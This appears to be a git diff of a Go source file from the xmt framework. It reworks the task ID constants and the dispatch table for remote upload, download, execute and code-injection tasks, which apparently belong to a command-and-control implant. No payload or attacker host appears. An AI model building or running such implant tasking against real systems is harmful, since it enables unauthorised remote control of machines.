@@ -8,18 +8,18 @@ import (
 	"github.com/iDigitalFlame/xmt/device"
 )
 
-// Custom Task Message ID Values
+// Built in Task Message ID Values
 //
-// TvRefresh      - 192:
-// TvUpload       - 193:
-// TvDownload     - 194:
-// TvExecute      - 195:
-// TvCode         - 196:
+// TvRefresh      - 192
+// TvUpload       - 193
+// TvDownload     - 194
+// TvExecute      - 195
+// TvCode         - 196
 const (
 	TvRefresh  uint8 = 0xC0
-	TvUpload   uint8 = 0xC1
-	TvDownload uint8 = 0xC2
-	TvExecute  uint8 = 0xC3
+	TvDownload uint8 = 0xC1
+	TvUpload   uint8 = 0xC2
+	TvExecute  uint8 = uint8(Execute)
 	TvCode     uint8 = 0xC4
 )
 
@@ -27,11 +27,11 @@ const (
 // are ignored. Adding a mapping to here will allow it to be executed via the client Scheduler.
 var Mappings = [256]Tasker{
 	// Built-in Mappings
-	TvRefresh:  simpleTask(TvRefresh),
-	TvUpload:   simpleTask(TvUpload),
 	TvDownload: simpleTask(TvDownload),
-	TvExecute:  simpleTask(TvExecute),
-	TvCode:     simpleTask(TvCode),
+	TvUpload:   simpleTask(TvUpload),
+	TvCode:     Inject,
+	TvExecute:  Execute,
+	TvRefresh:  simpleTask(TvRefresh),
 
 	// WinTask related Mappings
 	wintask.DLLTask: wintask.DLLTask,
@@ -52,10 +52,10 @@ func (t simpleTask) Thread() bool {
 }
 func (t simpleTask) Do(x context.Context, p *com.Packet) (*com.Packet, error) {
 	switch uint8(t) {
-	case TvCode:
-		return code(x, p)
 	case TvUpload:
 		return upload(x, p)
+	case TvDownload:
+		return download(x, p)
 	case TvRefresh:
 		if err := device.Local.Refresh(); err != nil {
 			return nil, err
@@ -63,10 +63,6 @@ func (t simpleTask) Do(x context.Context, p *com.Packet) (*com.Packet, error) {
 		n := new(com.Packet)
 		device.Local.MarshalStream(n)
 		return n, nil
-	case TvExecute:
-		return process(x, p)
-	case TvDownload:
-		return download(x, p)
 	}
 	return nil, nil
 }
